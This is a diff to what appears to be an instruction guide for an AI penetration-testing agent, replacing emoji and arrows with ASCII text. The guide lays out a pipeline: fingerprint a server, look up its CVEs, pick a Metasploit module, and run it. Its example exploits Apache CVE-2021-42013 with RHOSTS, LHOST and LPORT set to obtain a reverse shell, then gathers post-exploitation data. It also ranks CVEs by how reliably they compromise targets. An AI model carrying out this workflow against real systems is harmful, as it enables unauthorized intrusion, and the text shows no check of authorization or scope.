@@ -32,28 +32,28 @@ Each result provides:
 | `CRITICAL` (9.0+) | Remotely exploitable, no auth, high impact | **Prioritize immediately** |
 | `HIGH` (7.0-8.9) | Serious, may need auth or user interaction | Pursue after criticals |
 | `MEDIUM` (4.0-6.9) | Situational, limited impact | Only if no higher-severity CVEs exist |
-| `🔴 ACTIVELY EXPLOITED` | CISA KEV catalog entry — known to be used in real attacks | **Highest priority** — patch window is over |
+| ` ACTIVELY EXPLOITED` | CISA KEV catalog entry — known to be used in real attacks | **Highest priority** — patch window is over |
 | `CWE` | Weakness type (e.g. CWE-89 for SQLi) | Guides your exploitation technique selection |
-| `[Exploit]`, `[Patch]`, `[Vendor Advisory]` | Reference tags | Exploit refs → `search_exploit` or direct copy |
+| `[Exploit]`, `[Patch]`, `[Vendor Advisory]` | Reference tags | Exploit refs -> `search_exploit` or direct copy |
 
 ---
 
-## 3. The Full Fingerprint → CVE → Exploit Pipeline
+## 3. The Full Fingerprint -> CVE -> Exploit Pipeline
 
 ```
 STEP 1: FINGERPRINT
-  http_request("GET", "http://target/") → extract Server header
-  → "Apache/2.4.49 (Ubuntu)"
+  http_request("GET", "http://target/") -> extract Server header
+  -> "Apache/2.4.49 (Ubuntu)"
 
 STEP 2: CVE LOOKUP
   search_cve("apache httpd", version="2.4.49")
-  → [CVE-2021-41773] CRITICAL (7.5) — Path traversal + RCE
-  → [CVE-2021-42013] CRITICAL (9.8) — Path traversal bypass
-     🔴 ACTIVELY EXPLOITED
+  -> [CVE-2021-41773] CRITICAL (7.5) — Path traversal + RCE
+  -> [CVE-2021-42013] CRITICAL (9.8) — Path traversal bypass
+      ACTIVELY EXPLOITED
 
 STEP 3: METASPLOIT MATCHING
   msf_command("search CVE-2021-42013")
-  → exploit/multi/http/apache_normalize_path_rce
+  -> exploit/multi/http/apache_normalize_path_rce
 
 STEP 4: EXPLOIT
   msf_run("exploit/multi/http/apache_normalize_path_rce",
@@ -61,7 +61,7 @@ STEP 4: EXPLOIT
           options={"RHOSTS": "10.0.0.5", "LHOST": "10.0.0.10", "LPORT": "4444"})
 
 STEP 5: CONFIRM
-  msf_sessions("list") → confirm shell
+  msf_sessions("list") -> confirm shell
   msf_run("post/multi/gather/env", options={"SESSION": 1})
 ```
 
@@ -71,15 +71,15 @@ STEP 5: CONFIRM
 
 When `search_cve` returns multiple results:
 
-1. **Actively exploited (CISA KEV)** → exploit these first, they're confirmed working in the wild
-2. **CRITICAL + Remote + No auth** → almost always works against unpatched targets
-3. **HIGH + Remote + No auth** → next priority
-4. **HIGH + Remote + Auth** → pursue after gaining credentials
-5. **MEDIUM or lower** → only if the objective demands it or no higher-severity CVEs exist
+1. **Actively exploited (CISA KEV)** -> exploit these first, they're confirmed working in the wild
+2. **CRITICAL + Remote + No auth** -> almost always works against unpatched targets
+3. **HIGH + Remote + No auth** -> next priority
+4. **HIGH + Remote + Auth** -> pursue after gaining credentials
+5. **MEDIUM or lower** -> only if the objective demands it or no higher-severity CVEs exist
 
 ---
 
-## 5. CVE → Metasploit Module Mapping
+## 5. CVE -> Metasploit Module Mapping
 
 After getting CVE IDs, cross-reference with Metasploit:
 
